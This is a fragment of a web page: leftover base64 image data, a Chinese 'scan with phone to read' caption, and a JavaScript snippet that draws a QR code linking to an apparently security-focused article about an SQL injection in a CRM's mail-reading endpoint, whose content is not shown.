PxUVA1Et1/H8lyFNZBeMGOvhznf63f+V/WrfvaBxzl+eyA2vfHP3MBpIE6142e3g0zdPjDzXT+IzzzMXN2+8hF3OUivnpfDOg9rfdyz1vDcB8mXt8J9RzwNpIx3vO8GjoFApgfPcXdUSN047VpDdOtg5urlrZCLpVXIYV1vvhBmT9VXVK4C5jysOaz16jFG9R7DHKR+zNW65yE+4P6tk49v9nG8Qr7Zuf5vj/M/AAAA//9m9V+aAAAABklEQVQDABuwocWoNv53AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxReadMail-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 